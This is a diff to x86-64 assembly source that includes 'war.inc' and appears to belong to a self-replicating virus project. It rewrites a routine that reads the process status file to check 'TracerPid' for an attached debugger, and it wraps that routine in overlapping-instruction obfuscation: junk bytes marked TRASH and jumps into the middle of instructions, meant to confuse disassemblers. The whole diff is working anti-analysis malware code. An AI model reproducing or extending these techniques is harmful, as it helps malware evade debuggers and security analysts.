@@ -6,7 +6,6 @@
 ;|     `- ,`- '            `--..__,,---'                    \/  \/ \__,_|_|    |
 ;-------------------------------------------------------------------------------
 
-
 %include "war.inc"
 
 section.text:
@@ -53,43 +52,78 @@ _h3ll0w0rld:
 %endif
 	; Overlapping instruction:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
-	push rdx
-	push rcx
-	lea rdi, [rel self_status]
-	xor rsi, rsi; O_RDONLY
-	push SYSCALL_OPEN
-	pop rax
-	syscall
-	sub rsp, 4096
+	jmp .there
+	.here:
+		db `\x48\xb8`; TRASH ; mov rax,
 
-	push rax
-	pop rdi
-	mov rsi, rsp
-	push 4096
-	pop rdx
-	xor rax, rax; SYSCALL_READ
-	syscall
+		push rdx
+		push rcx
+		lea rdi, [rel self_status]
+		xor rsi, rsi; O_RDONLY
 
-	push rdi
-	push rsi
-	pop rdi
-	push rax
-	pop rsi
-	lea rdx, [rel tracer_pid]
-	push 13
-	pop rcx
-	call _ft_memmem
+		jmp $+6
+		db `\x42\x42\x48\xbf`; TRASH ; 42; 42; mov rdi,
 
-	pop rdi
-	push rax
-	push SYSCALL_CLOSE
-	pop rax
-	syscall
-	pop rax
+		push SYSCALL_OPEN
+		pop rax
+		syscall
+		push rax
+		pop rdi
 
-	add rsp, 4096
-	pop rcx
-	pop rdx
+		jmp $+4
+		syscall; TRASH ;
+
+		sub rsp, 4096
+
+		mov rsi, rsp
+		push 4096
+		pop rdx
+		
+		jmp $+4
+		db `\x48\x8d`; TRASH ; lea rax, rcx
+
+		xor rax, rax; SYSCALL_READ
+		syscall
+
+		jmp $+4
+		db `\x48\x81`; TRASH; add
+
+		push rdi
+		push rsi
+		pop rdi
+		push rax
+		pop rsi
+
+		jmp $+6
+		db `\x42\x50\x48\xb8`; TRASH;
+
+		lea rdx, [rel tracer_pid]
+
+		jmp $+6
+		db `\x42\x58\x48\xbf`; TRASH;
+
+		push 13
+		pop rcx
+		call _ft_memmem
+
+		jmp $+4
+		db `\x88\x66`; TRASH;
+		jmp $+5
+		db `\x58\x48\xbf`; TRASH
+
+		pop rdi
+		push rax
+		push SYSCALL_CLOSE
+		pop rax
+		syscall
+		pop rax
+
+		add rsp, 4096
+		pop rcx
+		pop rdx
+		jmp .there + 2
+	.there:
+		jmp .here + 2
 
 	cmp rax, 0x0
 	jnz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
